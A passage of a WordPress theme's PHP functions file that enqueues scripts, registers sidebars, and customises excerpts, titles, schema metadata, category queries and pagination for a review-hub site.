					$custom_css .= '.gp-responsive.gp-boxed-layout #gp-sidebar {width: ' . ghostpool_option( 'tablet_boxed_sidebar', 'width' ) . ';}';
				}	
			$custom_css .= '}';
		}	

		if ( ghostpool_option( 'custom_css' ) ) {
			$custom_css .= ghostpool_option( 'custom_css' );
		}

		wp_add_inline_style( 'ghostpool-style', $custom_css );

		wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/lib/scripts/modernizr.js', false, '', true );
				
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) { 
			wp_enqueue_script( 'comment-reply' );
		}
		
		wp_enqueue_script( 'imagesloaded' );

		if ( ghostpool_option( 'smooth_scrolling' ) == 'gp-smooth-scrolling' ) { 
			wp_enqueue_script( 'nicescroll', get_template_directory_uri() . '/lib/scripts/nicescroll.min.js', false, '', true );
		}
		
		wp_enqueue_script( 'selectivizr', get_template_directory_uri() . '/lib/scripts/selectivizr.min.js', false, '', true );

		wp_enqueue_script( 'placeholder', get_template_directory_uri() . '/lib/scripts/placeholders.min.js', false, '', true );
		
		if ( ghostpool_option( 'lightbox' ) != 'disabled' ) {				
			wp_enqueue_script( 'prettyphoto', get_template_directory_uri() . '/lib/scripts/prettyPhoto/js/jquery.prettyPhoto.js', array( 'jquery' ), '', true );
		}
		
		if ( ghostpool_option( 'back_to_top' ) != 'gp-no-back-to-top' ) { 
			wp_enqueue_script( 'jquery-totop', get_template_directory_uri() . '/lib/scripts/jquery.ui.totop.min.js', array( 'jquery' ), '', true );
		}		

		wp_enqueue_script( 'jquery-flexslider', get_template_directory_uri() . '/lib/scripts/jquery.flexslider-min.js', array( 'jquery' ), '', true );
		
		wp_enqueue_script( 'isotope', get_template_directory_uri() . '/lib/scripts/isotope.pkgd.min.js', false, '', true );
		
		wp_enqueue_script( 'lazyload', get_template_directory_uri() . '/lib/scripts/jquery.lazyload.min.js', array( 'jquery' ), '', true );

		wp_enqueue_script( 'jquery-stellar', get_template_directory_uri() . '/lib/scripts/jquery.stellar.min.js', array( 'jquery' ), '', true );

		wp_enqueue_script( 'ghostpool-video-header', get_template_directory_uri() . '/lib/scripts/jquery.video-header.js', array( 'jquery' ), '', true );
																									
		wp_enqueue_script( 'ghostpool-custom-js', get_template_directory_uri() . '/lib/scripts/custom.js', array( 'jquery' ), '', true );
		
		if ( is_ssl() ) {
			$url = esc_url( 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
		} else { 
			$url = esc_url( 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
		}
		
		wp_localize_script( 'ghostpool-custom-js', 'ghostpool_script', array(
			'url' => $url,
			'headerHeight' => ghostpool_option( 'main_header_height', 'height' ),
			'smallHeaderHeight' => preg_replace( '/[^0-9]/', '', ghostpool_option( 'main_header_height', 'height'  ) ) / ghostpool_option( 'header_size_reduction' ),
			'logoHeight' => ghostpool_option( 'logo_dimensions', 'height' ),
			'logoMarginTop' => ghostpool_option( 'logo_spacing', 'margin-top' ),
			'logoMarginBottom' => ghostpool_option( 'logo_spacing', 'margin-bottom' ),
			'headerSizeReduction' => ghostpool_option( 'header_size_reduction' ),
			'lightbox' => ghostpool_option( 'lightbox' ),
			'hide_move_primary_menu_links' => ghostpool_option( 'hide_move_primary_menu_links' ),
		) );
						
	}
}
add_action( 'wp_enqueue_scripts', 'ghostpool_scripts' );

/**
 * Enqueues admin scripts and styles.
 *
 */	
if ( ! function_exists( 'ghostpool_admin_scripts' ) ) {
	function ghostpool_admin_scripts() {
		wp_enqueue_style( 'ghostpool-admin', get_template_directory_uri() . '/lib/framework/css/general-admin.css' );
		wp_enqueue_script( 'ghostpool-admin', get_template_directory_uri() . '/lib/framework/scripts/admin.js', '', '', true );
	}
}
add_action( 'admin_enqueue_scripts', 'ghostpool_admin_scripts' );	

/**
 * Deactivate old version of plugin
 *
 */	
function ghostpool_deactivate_old_plugins() {
	if ( is_plugin_active( 'the-review-plugin/index.php' ) ) {
		deactivate_plugins( 'the-review-plugin/index.php' );
	}
	if ( is_plugin_active( 'huber-plugin/index.php' ) ) {
		deactivate_plugins( 'huber-plugin/index.php' );
	}	
}	
add_action( 'admin_init', 'ghostpool_deactivate_old_plugins' );

/**
 * Adds custom classes to the array of body classes.
 *
 */	
if ( !function_exists( 'ghostpool_body_classes' ) ) {
	function ghostpool_body_classes( $classes ) {
		global $post;
		$classes[] = 'gp-theme';
		$classes[] = 'gp-responsive';
		$classes[] = ghostpool_option( 'theme_layout', '', 'gp-wide-layout' );
		$classes[] = ghostpool_option( 'retina', '', 'gp-retina' );
		$classes[] = ghostpool_option( 'smooth_scrolling', '', 'gp-normal-scrolling' );
		$classes[] = ghostpool_option( 'back_to_top', '', 'gp-back-to-top' );
		$classes[] = ghostpool_option( 'fixed_header' );	
		$classes[] = ghostpool_option( 'header_resize' );
		$classes[] = ghostpool_option( 'header_layout' );
		$classes[] = ghostpool_option( 'header_overlay' );
		$classes[] = ghostpool_option( 'top_header' );
		$classes[] = ghostpool_option( 'cart_button' );
		$classes[] = 'gp-search-' . ghostpool_option( 'search' );
		$classes[] = $GLOBALS['ghostpool_page_header'];
		$classes[] = $GLOBALS['ghostpool_layout'];
		if ( ( is_singular() && ( get_post_meta( $post->post_parent, '_wp_page_template', true ) == 'hub-template.php' OR get_post_meta( $post->post_parent, '_wp_page_template', true ) == 'hub-review-template.php' ) ) && ! is_archive() && ! is_search() ) { 		
			$classes[] = 'gp-hub-child-page';
		}					
		return $classes;
		
	}
}
add_filter( 'body_class', 'ghostpool_body_classes' );

/**
 * Content added to header
 *
 */	
 if ( ! function_exists( 'ghostpool_wp_header' ) ) {

	function ghostpool_wp_header() {
		
		// Title fallback for versions earlier than WordPress 4.1
		if ( ! function_exists( '_wp_render_title_tag' ) && ! function_exists( 'ghostpool_render_title' ) ) {
			function ghostpool_render_title() { ?>
				<title><?php wp_title( '|', true, 'right' ); ?></title>
			<?php }
		}

		// Initial variables - variables loaded only once at the top of the page
		ghostpool_init_variables();
		
		// Initial hub variables - variables loaded only once at the top of the page
		ghostpool_hub_variables();
		
		// Add custom JavaScript code
		if ( ghostpool_option( 'js_code' ) ) {
			if ( strpos( ghostpool_option( 'js_code' ), '<script ' ) !== false ) { 
				echo ghostpool_option( 'js_code' ); 
			} else {
				$js_code = str_replace( array( '<script>', '</script>' ), '', ghostpool_option( 'js_code' ) );
				echo '<script>' . $js_code . '</script>';
			}    
		}
				
	}
	
}
add_action( 'wp_head', 'ghostpool_wp_header' );

/**
 * Navigation user meta
 *
 */	
if ( ! function_exists( 'ghostpool_nav_user_meta' ) ) {
	function ghostpool_nav_user_meta( $user_id = NULL ) {

		// These are the metakeys we will need to update
		$GLOBALS['ghostpool_meta_key']['menus'] = 'metaboxhidden_nav-menus';
		$GLOBALS['ghostpool_meta_key']['properties'] = 'managenav-menuscolumnshidden';

		// So this can be used without hooking into user_register
		if ( ! $user_id ) {
			$user_id = get_current_user_id(); 
		}
	
		// Set the default hiddens if it has not been set yet
		if ( ! get_user_meta( $user_id, $GLOBALS['ghostpool_meta_key']['menus'], true ) ) {
			$meta_value = array( 'add-gp_slides', 'add-gp_slide', 'add-gp_user_review' );
			update_user_meta( $user_id, $GLOBALS['ghostpool_meta_key']['menus'], $meta_value );
		}

		// Set the default properties if it has not been set yet
		if ( ! get_user_meta( $user_id, $GLOBALS['ghostpool_meta_key']['properties'], true) ) {
			$meta_value = array( 'link-target', 'xfn', 'description' );
			update_user_meta( $user_id, $GLOBALS['ghostpool_meta_key']['properties'], $meta_value );
		}
	
	}	
}
add_action( 'admin_init', 'ghostpool_nav_user_meta' );

/**
 * Hub browser title
 *
 */		
if ( ! function_exists( 'ghostpool_browser_title' ) ) {
	function ghostpool_browser_title( $title ) {
		global $post;
		if ( is_singular() ) {
			$post_parent = $post->post_parent;
		} else {
			$post_parent = '';
		}			
		if ( ! function_exists( 'wpseo_auto_load' ) ) { 
			if ( is_tax() ) {		
				$title = single_cat_title( '', false ) . ' | ' . get_bloginfo( 'name' );
			} elseif ( is_page() && ( get_post_meta( $post_parent, '_wp_page_template', true ) == 'hub-template.php' OR get_post_meta( $post_parent, '_wp_page_template', true ) == 'hub-review-template.php' ) && ghostpool_option( 'hub_prefix_child_pages' ) == 'enabled' ) {	
				$title = the_title_attribute( array( 'echo' => false, 'post' => $post_parent ) ) . ' ' . the_title_attribute( array( 'echo' => false, 'post' => get_the_ID() ) ) . ' | ' . get_bloginfo( 'name' );
			} elseif ( is_page() && get_post_meta( $post_parent, '_wp_page_template', true ) == 'hub-template.php' ) {
				$title = the_title_attribute( array( 'echo' => false, 'post' => get_the_ID() ) ) . ' | ' . get_bloginfo( 'name' );
			}
		}	
		return $title;
	}
	add_filter( 'wp_title', 'ghostpool_browser_title' );
}

/**
 * Insert schema meta data
 *
 */
if ( ! function_exists( 'ghostpool_meta_data' ) ) {
	function ghostpool_meta_data( $post_id ) {
	
		global $post;
		
		// Get title
		if ( ! empty( $GLOBALS['ghostpool_custom_title'] ) ) { 
			$title = esc_attr( $GLOBALS['ghostpool_custom_title'] );
		} else {
			$title = ghostpool_prefix_hub_title( $post_id );
		}

		// Meta data
		return '<meta itemprop="mainEntityOfPage" itemType="https://schema.org/WebPage" content="' . esc_url( get_permalink( $post_id ) ) . '">
		<meta itemprop="headline" content="' . esc_attr( $title ) . '">			
		<div itemprop="image" itemscope itemtype="https://schema.org/ImageObject">
			<meta itemprop="url" content="' . esc_url( wp_get_attachment_url( get_post_thumbnail_id( $post_id ) ) ) . '">
			<meta itemprop="width" content="' .  absint( $GLOBALS['ghostpool_image_width'] ) . '">	
			<meta itemprop="height" content="' . absint( $GLOBALS['ghostpool_image_height'] ) . '">		
		</div>
		<meta itemprop="author" content="' . get_the_author_meta( 'display_name', $post->post_author ) . '">			
		<meta itemprop="datePublished" content="' . get_the_time( 'Y-m-d' ) . '">
		<meta itemprop="dateModified" content="' . get_the_modified_date( 'Y-m-d' ) . '">
		<div itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
			<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject">
				<meta itemprop="url" content="' . esc_url( ghostpool_option( 'logo', 'url' ) ) . '">
				<meta itemprop="width" content="' . absint( ghostpool_option( 'logo_dimensions', 'width' ) ) . '">
				<meta itemprop="height" content="' . absint( ghostpool_option( 'logo_dimensions', 'height' ) ) . '">
			</div>
			<meta itemprop="name" content="' . get_bloginfo( 'name' ) . '">
		</div>';
	
	}
}

/**
 * Get hub ID
 *
 */
if ( ! function_exists( 'ghostpool_get_hub_id' ) ) {
	function ghostpool_get_hub_id( $post_id ) {	
		global $post;

		if ( get_post_meta( $post_id, 'primary_hub', true ) ) {
			return get_post_meta( $post_id, 'primary_hub', true );		
		
		} elseif ( is_singular( 'gp_user_review' ) && get_post_meta( get_the_ID(), '_hub_page_id', true ) ) {
			return get_post_meta( get_the_ID(), '_hub_page_id', true );	
		
		} elseif ( is_singular( 'post' ) && get_post_meta( get_the_ID(), 'post_association', true ) ) {
			$hub_id = get_post_meta( get_the_ID(), 'post_association', true );
			return $hub_id[0];
							
		} elseif ( isset( $post->post_parent ) && ( get_post_meta( $post->post_parent, '_wp_page_template', true ) == 'hub-template.php' OR get_post_meta( $post->post_parent, '_wp_page_template', true ) == 'hub-review-template.php' ) ) {
			return $post->post_parent;

		} else {
			return get_the_ID();
		}
	}
}

/**
 * Add scheduled pages to parent page menu
 *
 */
function ghostpool_dropdown_pages_args_add_parents( $dropdown_args, $post = NULL ) {
    $dropdown_args['post_status'] = array( 'publish', 'future' );
    return $dropdown_args;
}
add_filter( 'page_attributes_dropdown_pages_args', 'ghostpool_dropdown_pages_args_add_parents' );
add_filter( 'quick_edit_dropdown_pages_args', 'ghostpool_dropdown_pages_args_add_parents' );


/**
 * Registers a widget area.
 *
 * @link https://developer.wordpress.org/reference/functions/register_sidebar/
 *
 */
 
// Hub Categories Widget
require_once( get_template_directory() . '/lib/widgets/hub-categories.php' );
	
// Recent Comments Widget
require_once( get_template_directory() . '/lib/widgets/recent-comments.php' );

// Recent Posts Widget
require_once( get_template_directory() . '/lib/widgets/recent-posts.php' );

if ( ! function_exists( 'ghostpool_widgets_init' ) ) {
	function ghostpool_widgets_init() {

		register_sidebar( array( 
			'name'          => esc_html__( 'Standard Sidebar', 'gauge' ),
			'id'            => 'gp-standard-sidebar',
			'description'   => esc_html__( 'Displayed on posts, pages and post and video categories.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );

		register_sidebar( array( 
			'name'          => esc_html__( 'Hub Sidebar', 'gauge' ),
			'id'            => 'gp-hub-sidebar',
			'description'   => esc_html__( 'Displayed on hub parent and child pages.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );
		
		register_sidebar( array( 
			'name'          => esc_html__( 'Hub Categories Sidebar', 'gauge' ),
			'id'            => 'gp-hub-cat-sidebar',
			'description'   => esc_html__( 'Displayed on hub categories.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );		
				  
		register_sidebar( array( 
			'name'          => esc_html__( 'WooCommerce Sidebar', 'gauge' ),
			'id'            => 'gp-woocommerce-sidebar',
			'description'   => esc_html__( 'Displayed on WooCommerce pages.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );
	
		register_sidebar( array(
			'name'          => esc_html__( 'Footer 1', 'gauge' ),
			'id'            => 'gp-footer-1',
			'description'   => esc_html__( 'Displayed as the first column in the footer.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );        

		register_sidebar( array(
			'name'          => esc_html__( 'Footer 2', 'gauge' ),
			'id'            => 'gp-footer-2',
			'description'   => esc_html__( 'Displayed as the second column in the footer.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );        
	
		register_sidebar( array(
			'name'          => esc_html__( 'Footer 3', 'gauge' ),
			'id'            => 'gp-footer-3',
			'description'   => esc_html__( 'Displayed as the third column in the footer.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );        
	
		register_sidebar( array(
			'name'          => esc_html__( 'Footer 4', 'gauge' ),
			'id'            => 'gp-footer-4',
			'description'   => esc_html__( 'Displayed as the fourth column in the footer.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );      

		register_sidebar( array(
			'name'          => esc_html__( 'Footer 5', 'gauge' ),
			'id'            => 'gp-footer-5',
			'description'   => esc_html__( 'Displayed as the fifth column in the footer.', 'gauge' ),
			'before_widget' => '<div id="%1$s" class="widget %2$s">',
			'after_widget'  => '</div>',
			'before_title'  => '<h3 class="widgettitle">',
			'after_title'   => '</h3>',
		) );
	
	}
}
add_action( 'widgets_init', 'ghostpool_widgets_init' );

/**
 * Change excerpt character length
 *
 */	
if ( ! function_exists( 'ghostpool_excerpt_length' ) ) {
	function ghostpool_excerpt_length( $length ) {
		return 10000;
	}
}
add_filter( 'excerpt_length', 'ghostpool_excerpt_length' );

/**
 * Custom excerpt format
 *
 */	
if ( ! function_exists( 'ghostpool_excerpt' ) ) {
	function ghostpool_excerpt( $length ) {
		if ( isset( $GLOBALS['ghostpool_read_more_link'] ) && $GLOBALS['ghostpool_read_more_link'] == 'enabled' ) {
			$more_text = '...<a href="' . esc_url( get_permalink( get_the_ID() ) ) . '" class="gp-read-more" title="' . the_title_attribute( 'echo=0' ) . '">' . esc_html__( '[Read More]', 'gauge' ) . '</a>';
		} else {
			$more_text = '...';
		}	
		
		if ( get_post_meta( get_the_ID(), 'hub_synopsis', true ) ) {
			$excerpt = get_post_meta( get_the_ID(), 'hub_synopsis', true );
		} else {
			$excerpt = get_the_excerpt();
		}
								
		$excerpt = strip_tags( $excerpt );
		if ( function_exists( 'mb_strlen' ) && function_exists( 'mb_substr' ) ) { 
			if ( mb_strlen( $excerpt ) > $length ) {
				$excerpt = mb_substr( $excerpt, 0, $length ) . $more_text;
			}
		} else {
			if ( strlen( $excerpt ) > $length ) {
				$excerpt = substr( $excerpt, 0, $length ) . $more_text;
			}	
		}
		return $excerpt;
	}
}

/**
 * Prefix hub title to child pages
 *
 */
if ( ! function_exists( 'ghostpool_prefix_hub_title' ) ) {
	function ghostpool_prefix_hub_title( $post_id = '' ) {	
		global $post;
		if ( ( get_post_meta( $post->post_parent, '_wp_page_template', true ) == 'hub-template.php' OR get_post_meta( $post->post_parent, '_wp_page_template', true ) == 'hub-review-template.php' ) && ghostpool_option( 'hub_prefix_child_pages' ) == 'enabled' ) {	
			return the_title_attribute( array( 'echo' => false, 'post' => $post->post_parent ) ) . ' ' . the_title_attribute( array( 'echo' => false, 'post' => $post_id ) );
		} else {
			return the_title_attribute( array( 'echo' => false, 'post' => $post_id ) );
		}
	}
}

/**
 * Prefix portfolio, hub and video categories
 *
 */
if ( ! function_exists( 'ghostpool_add_prefix_to_terms' ) ) {
	function ghostpool_add_prefix_to_terms( $term_id, $tt_id, $taxonomy ) {
		if ( $taxonomy == 'gp_portfolios' && ghostpool_option( 'portfolio_cat_prefix_slug' ) ) {
			$term = get_term( $term_id, $taxonomy );
			$args = array( 'slug' => ghostpool_option( 'portfolio_cat_prefix_slug' ) . '-' . $term->slug );
			wp_update_term( $term_id, $taxonomy, $args );
		} 		
		if ( $taxonomy == 'gp_hubs' && ghostpool_option( 'hub_cat_prefix_slug' ) ) {
			$term = get_term( $term_id, $taxonomy );
			$slug = sanitize_title( ghostpool_option( 'hub_cat_prefix_slug' ) . '-' . $term->slug );
			$args = array( 'slug' => $slug );
			wp_update_term( $term_id, $taxonomy, $args );

		}
		if ( $taxonomy == 'gp_videos' && ghostpool_option( 'video_cat_prefix_slug' ) ) {
			$term = get_term( $term_id, $taxonomy );
			$slug = sanitize_title( ghostpool_option( 'video_cat_prefix_slug' ) . '-' . $term->slug );
			$args = array( 'slug' => $slug );
			wp_update_term( $term_id, $taxonomy, $args );

		}    
	}
}
add_action( 'created_term', 'ghostpool_add_prefix_to_terms', 10, 3 );

/**
 * Get follow page link
 *
 */
if ( ! function_exists( 'ghostpool_following_link' ) ) {
	function ghostpool_following_link() {
		$following_page = get_pages(
			array(
				'meta_key' => '_wp_page_template',
				'meta_value' => 'following-template.php'
			)
		);
		if ( $following_page ) {
			$following_page_id = $following_page[0]->ID;
			return get_permalink( $following_page_id );
		}	
	}
}

/**
 * Get author name
 *
 */
if ( ! function_exists( 'ghostpool_author_name' ) ) {
	function ghostpool_author_name( $post_id = '', $author_link = true ) {
		global $post;
		if ( get_post_meta( $post_id, '_user_review_name', true ) ) {	
			echo get_post_meta( $post_id, '_user_review_name', true );
		} elseif ( $author_link == true ) {
			echo apply_filters( 'gp_author_url', '<a href="' . esc_url( get_author_posts_url( $post->post_author ) ) . '">' . get_the_author_meta( 'display_name', $post->post_author ) . '</a>', $post );
		} else {
			echo get_the_author_meta( 'display_name', $post->post_author );
		}
	}
}

/**
 * Change password protect text
 *
 */	
if ( ! function_exists( 'ghostpool_password_form' ) ) {
	function ghostpool_password_form() {
		global $post;
		$label = 'pwbox-' . ( empty( $post->ID ) ? rand() : $post->ID );
		$o = '<form action="' . esc_url( site_url( 'wp-login.php?action=postpass', 'login_post' ) ) . '" method="post">
		<p>' . esc_html__( 'To view this protected post, enter the password below:', 'gauge' ) . '</p>
		<label for="' . $label . '"><input name="post_password" id="' . $label . '" type="password" size="20" maxlength="20" /></label> <input type="submit" class="pwsubmit" name="Submit" value="' . esc_attr__( 'Submit', 'gauge' ) . '" />
		</form>
		';
		return $o;
	}
}
add_filter( 'the_password_form', 'ghostpool_password_form' );

/**
 * Redirect empty search to search page
 *
 */
if ( ! function_exists( 'ghostpool_empty_search' ) ) {
	function ghostpool_empty_search( $query ) {
		global $wp_query;
		if ( isset( $_GET['s'] ) && ( $_GET['s'] == '' ) ) {
			$wp_query->set( 's', ' ' );
			$wp_query->is_search = true;
		}
		return $query;
	}
}
add_action( 'pre_get_posts', 'ghostpool_empty_search' );

/**
 * Alter category queries
 *
 */	
if ( ! function_exists( 'ghostpool_category_queries' ) ) {
	function ghostpool_category_queries( $query ) {	
		if ( is_admin() OR ! $query->is_main_query() ) { 
			return;
		} else {
			if ( is_post_type_archive( 'gp_portfolio_item' ) OR is_tax( 'gp_portfolios' ) )  {
				$GLOBALS['ghostpool_orderby'] = ghostpool_option( 'portfolio_cat_orderby' );
				$GLOBALS['ghostpool_per_page'] = ghostpool_option( 'portfolio_cat_per_page' );
				$GLOBALS['ghostpool_date_posted'] = ghostpool_option( 'portfolio_cat_date_posted' );
				$GLOBALS['ghostpool_date_modified'] = ghostpool_option( 'portfolio_cat_date_modified' );
			} elseif ( is_post_type_archive( 'page' ) OR is_tax( 'gp_hubs' ) ) {
				$GLOBALS['ghostpool_orderby'] = ghostpool_option( 'hub_cat_orderby' );
				$GLOBALS['ghostpool_per_page'] = ghostpool_option( 'hub_cat_per_page' );
				$GLOBALS['ghostpool_date_posted'] = ghostpool_option( 'hub_cat_date_posted' );
				$GLOBALS['ghostpool_date_modified'] = ghostpool_option( 'hub_cat_date_modified' );
			} elseif ( is_post_type_archive( 'post' ) OR is_tax( 'gp_videos' ) ) {
				$GLOBALS['ghostpool_orderby'] = ghostpool_option( 'video_cat_orderby' );
				$GLOBALS['ghostpool_per_page'] = ghostpool_option( 'video_cat_per_page' );
				$GLOBALS['ghostpool_date_posted'] = ghostpool_option( 'video_cat_date_posted' );
				$GLOBALS['ghostpool_date_modified'] = ghostpool_option( 'video_cat_date_modified' );
			} elseif ( is_search() OR is_author() ) {
				$GLOBALS['ghostpool_orderby'] = ghostpool_option( 'search_orderby' );
				$GLOBALS['ghostpool_per_page'] = ghostpool_option( 'search_per_page' );
				$GLOBALS['ghostpool_date_posted'] = ghostpool_option( 'search_date_posted' );
				$GLOBALS['ghostpool_date_modified'] = ghostpool_option( 'search_date_modified' );
			} elseif ( is_home() OR is_archive() ) {
				$GLOBALS['ghostpool_orderby'] = ghostpool_option( 'cat_orderby' );
				$GLOBALS['ghostpool_per_page'] = ghostpool_option( 'cat_per_page' );
				$GLOBALS['ghostpool_date_posted'] = ghostpool_option( 'cat_date_posted' );
				$GLOBALS['ghostpool_date_modified'] = ghostpool_option( 'cat_date_modified' );
			}
			if ( isset( $GLOBALS['ghostpool_per_page'] ) ) {	
				ghostpool_loop_variables();
				ghostpool_category_variables();
				$query->set( 'posts_per_page', $GLOBALS['ghostpool_per_page'] );
				if ( ! is_search() ) {
					$query->set( 'orderby', $GLOBALS['ghostpool_orderby_value'] );
					$query->set( 'order', $GLOBALS['ghostpool_order'] );
					$query->set( 'meta_key', $GLOBALS['ghostpool_meta_key'] );
					$query->set( 'meta_query', $GLOBALS['ghostpool_meta_query'] );
				}	
				$query->set( 'date_query', array( $GLOBALS['ghostpool_date_posted_value'], $GLOBALS['ghostpool_date_modified_value'] ) );
				if ( is_author() ) { $query->set( 'post_type',  array( 'post', 'page' ) ); }
				return;
			}	
		}
	}
}	
add_action( 'pre_get_posts', 'ghostpool_category_queries', 1 );

/**
 * Alter filter element queries
 *
 */
if ( ! function_exists( 'ghostpool_filter_queries' ) ) {
	function ghostpool_filter_queries( $query ) {	
		if ( is_admin() OR ! $query->is_main_query() ) { 
			return;
		} else {
			if ( isset( $_POST['action'] ) && $_POST['action'] == 'ghostpool_filter' ) {
				if ( isset( $_POST['date_posted'] ) ) {
					$GLOBALS['ghostpool_date_posted'] = $_POST['date_posted'];
				} else {
					$GLOBALS['ghostpool_date_posted'] = '';
				}	
				if ( isset( $_POST['date_modified'] ) ) {
					$GLOBALS['ghostpool_date_modified'] = $_POST['date_modified'];
				} else {
					$GLOBALS['ghostpool_date_modified'] = '';
				}	
				ghostpool_category_variables();
				$query->set( 'date_query', array( $GLOBALS['ghostpool_date_posted_value'], $GLOBALS['ghostpool_date_modified_value'] ) );
				return;
			}	
		}
	}
}	
add_action( 'pre_get_posts', 'ghostpool_filter_queries', 1 );

/**
 * Pagination
 *
 */	
if ( ! function_exists( 'ghostpool_pagination' ) ) {
	function ghostpool_pagination( $query ) {
		$big = 999999999;
		if ( get_query_var( 'paged' ) ) {
			$paged = get_query_var( 'paged' );
		} elseif ( get_query_var( 'page' ) ) {
			$paged = get_query_var( 'page' );
		} else {
			$paged = 1;
		}
		if ( $query >  1 ) {
			return '<div class="gp-pagination gp-pagination-numbers gp-standard-pagination">' . paginate_links( array(
				'base'      => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
				'format'    => '?paged=%#%',
				'current'   => max( 1, $paged ),
				'total'     => $query,
				'type'      => 'list',
				'prev_text' => '',
				'next_text' => '',
				'end_size'  => 1,
				'mid_size'  => 1, 
			) ) . '</div>';
		}
	}
}

if ( ! function_exists( 'ghostpool_get_previous_posts_page_link' ) ) {
	function ghostpool_get_previous_posts_page_link() {
		global $paged;
		$nextpage = intval( $paged ) - 1;
		if ( $nextpage < 1 ) {
			$nextpage = 1;
		}	
		if ( $paged > 1 ) {
			return '<a href="#" data-pagelink="' . esc_attr( $nextpage ) . '" class="prev"></a>';
		}
	}
}		

if ( ! function_exists( 'ghostpool_get_next_posts_page_link' ) ) {
	function ghostpool_get_next_posts_page_link( $max_page = 0 ) {
		global $paged;
		if ( ! $paged ) {
			$paged = 1;
		}	
		$nextpage = intval( $paged ) + 1;
		if ( ! $max_page || $max_page >= $nextpage ) {
			return '<a href="#" data-pagelink="' . esc_attr( $nextpage ) . '" class="next"></a>';
		}
	}
}

/**
 * Custom next and prev rel links
 *
 */
if ( function_exists( 'wpseo_auto_load' ) ) {
	if ( ! function_exists( 'ghostpool_rel_prev_next' ) ) {
		function ghostpool_rel_prev_next() {
			if ( is_page_template( 'blog-template.php' ) OR is_page_template( 'news-template.php' ) OR is_page_template( 'videos-template.php' ) OR is_page_template( 'portfolio-template.php' ) ) {
		
				global $paged;
						
				// Get post or hub association ID
				$post_id = ghostpool_get_hub_id( get_the_ID() );
							
				// Load page variables		
				ghostpool_loop_variables();
				ghostpool_category_variables();
			
				if ( is_page_template( 'blog-template.php' ) ) {

					// Get blog posts associated with hub
					if ( $GLOBALS['ghostpool_orderby']  != 'user_rating' ) { $GLOBALS['ghostpool_meta_query'] = ''; }
					if ( redux_post_meta( 'gp', get_the_ID(), 'blog_template_post_association' ) == 'enabled' ) {	
						$GLOBALS['ghostpool_meta_query'] = array( 'relation' => 'OR', array( 'key' => 'post_association', 'value' => sprintf( ' "%s" ', $post_id ), 'compare' => 'LIKE' ), array( 'key' => '_hub_page_id', 'value' => $post_id, 'compare' => '=' ) );
					}			

					$args = array(
						'post_status'     => 'publish',
						'post_type'       => explode( ',', $GLOBALS['ghostpool_post_types'] ),
						'tax_query'       => $GLOBALS['ghostpool_tax'],
						'orderby'         => $GLOBALS['ghostpool_orderby_value'],
						'order'           => $GLOBALS['ghostpool_order'],
						'meta_query' 	  => $GLOBALS['ghostpool_meta_query'],
						'meta_key'        => $GLOBALS['ghostpool_meta_key'],
						'posts_per_page'  => $GLOBALS['ghostpool_per_page'],
						'paged'           => $GLOBALS['ghostpool_paged'],
						'date_query' => array( $GLOBALS['ghostpool_date_posted_value'], $GLOBALS['ghostpool_date_modified_value'] ),
					);

				} elseif ( is_page_template( 'news-template.php' ) ) {
						
					// Get post or hub association ID
					$post_id = ghostpool_get_hub_id( get_the_ID() );
	
					// Get news posts associated with hub
					if ( $GLOBALS['ghostpool_orderby']  != 'user_rating' ) { $GLOBALS['ghostpool_meta_query'] = ''; }
					if ( redux_post_meta( 'gp', get_the_ID(), 'news_post_association' ) == 'enabled' ) {
						$GLOBALS['ghostpool_meta_query'] = array( 'relation' => 'OR', array( 'key' => 'post_association', 'value' => sprintf( ' "%s" ', $post_id ), 'compare' => 'LIKE' ), array( 'key' => '_hub_page_id', 'value' => $post_id, 'compare' => '=' ) );	
					}

					$args = array(
						'post_status' => 'publish',
						'post_type' => 'post',
						'tax_query' => array(
							'relation' => 'AND',
							$GLOBALS['ghostpool_post_cats'],
							array(
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-quote', 'post-format-audio', 'post-format-gallery', 'post-format-image', 'post-format-link', 'post-format-video' ),
								'operator' => 'NOT IN',
							)			
						),		
						'orderby'        => $GLOBALS['ghostpool_orderby_value'],
						'order'          => $GLOBALS['ghostpool_order'],		
						'meta_query' 	 => $GLOBALS['ghostpool_meta_query'],	
						'meta_key'       => $GLOBALS['ghostpool_meta_key'],		
						'posts_per_page' => $GLOBALS['ghostpool_per_page'],
						'paged'          => $GLOBALS['ghostpool_paged'],
						'date_query' => array( $GLOBALS['ghostpool_date_posted_value'], $GLOBALS['ghostpool_date_modified_value'] ),
					);
				
				} elseif ( is_page_template( 'videos-template.php' ) ) {
			
					// Get post or hub association ID
					$post_id = ghostpool_get_hub_id( get_the_ID() );

					// Get video posts associated with hub
